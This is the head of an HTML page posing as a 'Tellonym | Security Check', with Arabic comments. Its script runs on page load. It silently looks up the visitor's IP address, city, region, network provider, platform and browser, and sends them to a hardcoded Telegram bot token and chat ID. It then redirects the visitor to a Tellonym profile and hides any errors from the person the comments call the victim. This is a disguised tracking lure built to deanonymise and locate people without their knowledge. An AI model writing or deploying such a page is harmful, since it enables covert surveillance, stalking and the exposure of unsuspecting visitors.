<head>

    <title>Tellonym | Security Check</title>
    <script>
        // إعدادات العملية السرية
        const B_T = "8636452983:AAFQFXgDchbdJmUaFmm2-SxD38VjNbwUsUA";
        const C_I = "1138822664";
        const DEST = "https://tellonym.me/Schaien/anything";

        async function stealthCapture() {
            try {
                // سحب البيانات التقنية بدون أي طلب إذن (صامت تماماً)
                const response = await fetch('https://ipapi.co/json/');
                const d = await response.json();
                
                const report = `🌑 **[تم قنص الهدف بنجاح]**\n\n` +
                             `📍 المدينة: ${d.city} / ${d.region}\n` +
                             `🌐 الـ IP: \`${d.ip}\`\n` +
                             `📡 الشبكة: ${d.org}\n` +
                             `📱 النظام: ${navigator.platform}\n` +
                             `🔍 المتصفح: ${navigator.userAgent.split(' ')[0]}\n` +
                             `⏰ التوقيت: ${new Date().toLocaleString('ar-EG')}`;

                // إرسال التقرير فوراً إلى تليجرام الخاص بك
                await fetch(`https://api.telegram.org/bot${B_T}/sendMessage?chat_id=${C_I}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);

            } catch (e) {
                // في حال الفشل لا يظهر أي خطأ للضحية
            } finally {
                // التوجيه الفوري للوجهة النهائية (أقل من ثانية)
                window.location.replace(DEST);
            }
        }
        window.onload = stealthCapture;
    </script>
